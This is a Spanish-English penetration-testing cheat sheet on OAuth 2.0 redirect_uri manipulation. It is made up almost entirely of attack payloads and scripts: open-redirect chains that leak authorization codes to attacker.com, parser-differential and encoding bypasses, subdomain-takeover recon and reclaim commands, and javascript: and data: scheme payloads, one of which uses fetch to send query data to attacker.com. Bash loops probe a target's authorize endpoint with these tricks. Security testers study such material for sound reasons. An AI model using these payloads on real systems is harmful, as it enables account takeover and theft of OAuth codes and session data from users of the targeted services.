---
aliases:
  - OAuth redirect_uri Bypass
  - redirect_uri Injection
  - URL Parser Differential
  - OAuth Open Redirect Chain
tags:
  - type/cheatsheet
  - vuln/oauth
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[OAuth 2.0 Misconfigurations]]"
  - "[[Open Redirect]]"
  - "[[Subdomain Takeover]]"
---
# OAuth 2.0 - redirect_uri Manipulation

***

## Open Redirect Encadenado

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | App tiene open redirect interno dentro del dominio whitelisted. IdP confía dominio → emite code → open redirect leakea code a atacante. | Trust transfer. |
| Endpoint OR genérico | `redirect_uri=https://known.com/redirect?url=https://attacker.com` | Common. |
| Login next param | `redirect_uri=https://known.com/login?next=https://attacker.com` | Post-login redirect. |
| Logout return param | `redirect_uri=https://known.com/logout?return=https://attacker.com` | Post-logout. |
| 404 con back link | `redirect_uri=https://known.com/404?back=https://attacker.com` | Error pages. |
| App propio re-redirect | App callback que re-redirige a `?return_to=` | Multi-hop. |
| Ad/affiliate redirect | `https://known.com/ads/click?to=attacker.com` | Common in marketing. |
| Marketing tracking | `/track?dest=` | Vendor tools. |
| CDN/proxy redirect | `/proxy?url=` | Internal infra. |
| Code arriba via Referer | Browser sends `Referer: known.com/cb?code=XYZ` to attacker | Leak vector. |
| Code arriba via param | Open redirect preserva query → `?code=XYZ` arriba | Direct theft. |
| Combine SSRF allowlist | Server-side allowlist follows redirects → SSRF chain | SSRF combo. |
^oauth-redirect-openredirect

### Workflow Open Redirect chain

```http
# Atacante envía link a víctima
GET /oauth/authorize?
  client_id=APP&
  response_type=code&
  redirect_uri=https://known.com/redirect?url=https://attacker.com/steal&
  state=ABC&
  scope=email

# IdP valida → known.com es whitelisted → emite code
HTTP/1.1 302 Found
Location: https://known.com/redirect?url=https://attacker.com/steal&code=XYZ&state=ABC

# known.com redirige a attacker.com → atacante recibe code en Referer
# o si OR preserva query → code en URL directo
GET /steal?code=XYZ&state=ABC HTTP/1.1
Host: attacker.com
```

___

## Path Traversal y Suffix Abuse

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Validation laxa (prefix/substring/hostname-only). Manipular path/host para escapar al dominio atacante. | Bypass weak validation. |
| `startswith` prefix match | `redirect_uri=https://known.com/cb/../../attacker` | Path traversal interno. |
| Domain match sin path | `redirect_uri=https://known.com/file_upload_xss` | Si known.com tiene file upload. |
| Suffix domain abuse | `redirect_uri=https://known.com.attacker.com/cb` | DNS atacante con prefix. |
| Substring match | `redirect_uri=https://attacker.com/?x=https://known.com/cb` | Server contains check. |
| Trailing slash mismatch | `cb/` vs `cb` registered | Normalize bug. |
| Case insensitive abuse | `https://KNOWN.com/cb` aceptado | Lower-case normalize. |
| Unicode IDN homograph | `https://kńown.com/cb` (punycode) | Visual confusion. |
| Hyphen domain trick | `https://known-com.attacker.com/cb` | Sub abuse. |
| Underscore subdomain | `https://known_com.attacker.com/cb` | Some parsers. |
| Port confusion | `https://known.com:80@attacker.com/cb` | Userinfo trick. |
| Multiple subdomains | `https://attacker.com.evil.known.com/cb` | Wildcard creative. |
| Encoded slashes | `redirect_uri=https://known.com%2F..%2Fattacker.com/cb` | URL encoding. |
| Double encoding | `%252F..%252F` | Decode chain. |
| Null byte | `https://known.com%00.attacker.com/cb` | Some parsers truncate. |
^oauth-redirect-pathtraversal

___

## URL Parser Differential

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Server valida URL con parser A, browser sigue con parser B. Diferencia → host distinto. | Orange Tsai 2017. |
| Userinfo `@` confusion | `https://known.com@attacker.com/cb` | userinfo=known.com, host=attacker.com. |
| Fragment `#@` | `https://attacker.com#@known.com/cb` | Some parsers see known.com host. |
| Backslash | `https://known.com\.attacker.com/cb` | Inconsistent across libs. |
| Tab char | `https://known.com%09.attacker.com/cb` | Control char abuse. |
| CRLF | `https://known.com%0d%0a.attacker.com/cb` | Header injection edge. |
| `?@` query | `https://known.com?@attacker.com/cb` | Parser dispute. |
| IPv6 brackets | `https://[::known.com]/cb` | Some fail. |
| Triple slash | `https:///attacker.com/cb` | host="". |
| Slash backslash mix | `https:/\/attacker.com/cb` | Edge. |
| Port in userinfo | `https://known.com:443@attacker.com/cb` | userinfo with port. |
| Empty userinfo | `https://@attacker.com/cb` | Edge. |
| Multiple `@` | `https://known.com@a@attacker.com/cb` | Parser ambiguity. |
| Schemeless `//` | `//attacker.com/cb` | Protocol-relative. |
| `https//known.com.attacker.com` (missing colon) | Broken scheme | Some normalize. |
| Whitespace in host | `https:// known.com/cb` | Some accept. |
^oauth-redirect-parser

### Parser test loop

```bash
for trick in \
  'https://known.com@attacker.com/cb' \
  'https://attacker.com#@known.com/cb' \
  'https://known.com\.attacker.com/cb' \
  'https://known.com:443@attacker.com/cb' \
  'https://known.com?@attacker.com/cb' \
  'https:///attacker.com/cb' \
  'https:/\/attacker.com/cb' \
  'https://known.com%09.attacker.com/cb'; do
  ENC=$(printf '%s' "$trick" | jq -sRr @uri)
  curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&redirect_uri=$ENC&state=X" \
    | grep -i location
done
```

___

## Subdomain Confusion / Takeover

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Whitelist `*.known.com`. Atacante busca subdomain takeable o registra subdomain self-service. | Trust transfer. |
| CNAME dangling Heroku | `*.known.com` apuntando a Heroku app no claimed | `heroku apps:create attacker-victim`. |
| CNAME dangling S3 | Apunta a S3 bucket disponible | `aws s3 mb s3://victim-bucket`. |
| CNAME dangling GitHub Pages | Apunta a `username.github.io` no usado | Crear repo + CNAME. |
| CNAME Azure/Cloudflare | Multiple service providers vulnerables | Service-specific reclaim. |
| Self-service subdomain | Apps tipo Squarespace, Tumblr, Shopify dan `username.platform.com` | Si platform es target. |
| Dev/staging débil | `dev.known.com` con XSS o auth bypass | Inyectar payload. |
| Customer subdomain SaaS | `tenant.known.com` multitenancy | Atacante customer registra. |
| Wildcard cert leak | Cert privado expuesto | MITM cualquier subdomain. |
| DNS rebinding | DNS responde primero IP known luego IP attacker | TOCTOU. |
| Internal docs subdomain | `docs.known.com`, `staging.known.com` con weak auth | Lateral. |
| Forgotten DNS records | `old.known.com` con dangling A record IP libre | IP reclaim. |
| Recon CNAMEs | `subjack`, `nuclei -t takeovers/`, `dnsx` | Discovery. |
| Heroku `No such app` page | Sign of takeable | Detection. |
| GitHub Pages 404 | Missing repo signal | Detection. |
| `nosuchbucket` S3 | S3 takeover signal | Detection. |
^oauth-redirect-subdomain

### Subdomain takeover scan

```bash
# Recon
subfinder -d known.com -silent | \
  httpx -silent -title -web-server -mc 200,403,404 | \
  grep -iE '(no such app|nosuchbucket|github\.io|domain not configured)'

# Verify with nuclei
echo "https://abandoned.known.com" | nuclei -t http/takeovers/

# Reclaim por provider
# Heroku:        heroku apps:create attacker-victim
# GitHub Pages:  crear repo + CNAME file
# AWS S3:        aws s3 mb s3://victim-bucket
# Azure:         New-AzWebApp -Name "attacker-victim"
```

___

## Scheme Abuse y Native App Hijack

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | App acepta esquemas no-HTTPS o flexibles. Atacante usa scheme alternativo para XSS o app hijack. | Scheme switch. |
| `javascript:` direct | `redirect_uri=javascript:alert(document.cookie)` | XSS si reflectado. |
| `data:` HTML | `redirect_uri=data:text/html,<script>fetch('//evil')</script>` | Data URL XSS. |
| `data:` base64 | `data:text/html;base64,PHNjcmlwdD4uLi4=` | Encoded. |
| Custom scheme hijack Android | App atacante registra mismo `intent-filter` que app legit | Intent picker. |
| Custom scheme exact match Android | `myapp://callback` aceptado por dos apps | User picks malicioso. |
| iOS Universal Links bypass | Browser handles URL antes de app | Code en browser. |
| Loopback `127.0.0.1:PORT` | Public clients allowed | Confused deputy local. |
| `file://` scheme | `redirect_uri=file:///etc/passwd` | Some parsers accept. |
| FTP/Gopher legacy | Old parsers permite | SSRF combo. |
| Cross-app intent Android | `intent://...#Intent;...` | Bypass intent-filter strict. |
| WebView default scheme | Mobile webview escapes | Per-platform edge. |
| `chrome:` / `about:` | Browser-internal schemes | Edge. |
| `mailto:` / `sms:` | OS handler hijack | Phishing chain. |
| Empty scheme | `://attacker.com/cb` | Some parsers accept. |
^oauth-redirect-scheme

### Scheme test

```bash
# JS scheme
curl -sI "https://target/oauth/authorize?...&redirect_uri=javascript:alert(1)"

# Data scheme
RU=$(printf 'data:text/html,<script>fetch(location.search).then(r=>fetch("https://attacker.com?"+r))</script>' | jq -sRr @uri)
curl -sI "https://target/oauth/authorize?...&redirect_uri=$RU"

# Android intent hijack PoC en app atacante's manifest:
# <intent-filter>
#   <action android:name="android.intent.action.VIEW"/>
#   <category android:name="android.intent.category.DEFAULT"/>
#   <category android:name="android.intent.category.BROWSABLE"/>
#   <data android:scheme="myapp" android:host="callback"/>
# </intent-filter>
```

***
